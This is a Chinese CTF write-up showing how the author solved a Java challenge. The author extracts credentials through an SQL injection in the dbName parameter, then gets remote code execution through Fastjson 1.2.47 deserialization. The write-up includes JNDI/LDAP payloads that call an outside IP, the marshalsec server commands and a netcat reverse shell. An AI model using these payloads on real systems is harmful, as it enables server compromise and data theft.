2020结束的网鼎杯比赛，一题Think_java大多数师傅都是用的自己构造的java反序列化来做的。正好当时用fastjson写出来了。

![v2-ee6bfb40ebb1da235728351fdd143044_720w.png](https://image.3001.net/images/20210203/1612323441_601a1a71ea31cf942c3da.png!small)

近些天也在挖洞，对于很多json传输的数据也会尝试一下fastjson的payload。

那就正好一起来看当时如何利用fastjson的，应该是个非预期吧，其实这个虽然说是ctf题目，但环境属实和实战没有区别，swagger-ui.html的fastjson。

之前看过fastjson作者的一篇文章，阿里的一个大佬，能够独立完成一个框架属实真的tql，fastjson连续好几年都被爆出漏洞，作者也是春节也忙着修复，可能这就是一份乐趣和成就感吧。

##  **0x01：写在前面**

拿到题目后，一开始通过审计代码发现代码

![v2-10f64c589f68bad48749298e3c62db15_720w.png](https://image.3001.net/images/20210203/1612323443_601a1a73627f09b14b54a.png!small)

审计发现一个注入，dbname我们可控

尝试注入

    
    
    dbName=myapp#' and 1=2 union select name from myapp.user;#
    dbName=myapp#' and 1=2 union select pwd from myapp.user;#

注入处账户密码留作备用（后面思路转变为exp后发现 上面账号密码没有用）

admin

admin@Rrrr_ctf_asde

然后经过逆向注意到导入了

    
    
    io.swagger.annotations.ApiOperation; 

发现是个swagger

Swagger在平时日常工作中用过是个优秀的文档编辑器

那么直接访问swagger-ui.html

![v2-b00744f9264f12a07a9d7f8b15df241d_720w.png](https://image.3001.net/images/20210203/1612323444_601a1a743b8f471373333.png!small)

这里想到swagger还有fastjson库 可以将java对象转换成json

19年爆出很多rce漏洞。尝试进行查看

网上查询fastjson得知存在rce漏洞

这个文章真的写的非常详细，可以说是手把手教学

    
    
    https://github.com/CaijiOrz/fastjson-1.2.47-RCE 

看到如下

![v2-d3c9e26d5aa1a0113ee2022df8c7013f_720w.png](https://image.3001.net/images/20210203/1612323444_601a1a74932c83b2907c4.png!small)

这里很符合fastjson的反序列化漏洞的json格式

![v2-7332d417ce45362d07e396e745b0ac13_720w.png](https://image.3001.net/images/20210203/1612323445_601a1a7527abe6c2b7d7c.png!small)

访问得知如下

按着一步一步操作来，首先准备云服务器，并将仓库文件上传到云服务器中。

![v2-90c4f517123c02218815bd4773199adc_720w.png](https://image.3001.net/images/20210203/1612323445_601a1a75a1c52ff2af882.png!small)

上传成功以后进行如下操作

首先进行测试

云服务器监听7777端口

在靶场执行

    
    
    {"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"x":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://121.36.19.222:7777/Exploit","autoCommit":true}}} 

发现有流量回显

那就继续按照文档往下做。

![v2-7574a4de6c585cd57d4dfdcfe7514bc1_720w.png](https://image.3001.net/images/20210203/1612323445_601a1a75e26d69fad6586.png!small)

Cd进去进行查看

修改exploit.java的ip为云服务器ip

![v2-d578adacc33099bed34e9e81065ad671_720w.png](https://image.3001.net/images/20210203/1612323446_601a1a7635b662037bad3.png!small)

Javac Exploit.java编译执行后得到Exploit.class

继续进行按照如下步骤继续执行

java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer

http://121.36.19.222/#Exploit

![v2-e8f36cd76c9ffec454978ac15462f0a1_720w.png](https://image.3001.net/images/20210203/1612323446_601a1a767ad896c2fd585.png!small)

执行成功如下所示，进行监听本地端口1389

![v2-5812109dff943ae6279dec288046b810_720w.png](https://image.3001.net/images/20210203/1612323446_601a1a76cb315090c4deb.png!small)

python -m SimpleHTTPServer 80

![v2-22e182134114986dab6f1ddaaf2c7db8_720w.png](https://image.3001.net/images/20210203/1612323447_601a1a775f31905a05c9d.png!small)

Nc 监听本地的8888端口

提交payload

    
    
    {"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"x":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://121.36.19.222:1389/Exploit","autoCommit":true}}}

执行后成功

![v2-a2986aad04445a923ef0d7952f45653d_720w.png](https://image.3001.net/images/20210203/1612323447_601a1a77a9736fbd7443c.png!small)

成功弹到shell ,

![v2-7bb9919581611f7287f19d752213953a_720w.png](https://image.3001.net/images/20210203/1612323448_601a1a780ea5b9cb4a9a8.png!small)

执行cat /flag可以得到如下flag

![v2-c8618fa3b7fde441e0766dbb7d2126a5_720w.png](https://image.3001.net/images/20210203/1612323448_601a1a786ee75d658d2cd.png!small)

##  **0x02：总结**

日常实战中，喜欢burp带上fastjson的检测脚本，遇到可疑的就发包检测一下。显示有漏洞就尝试payload打一下dnslog试试回显，再进一步进行深挖。

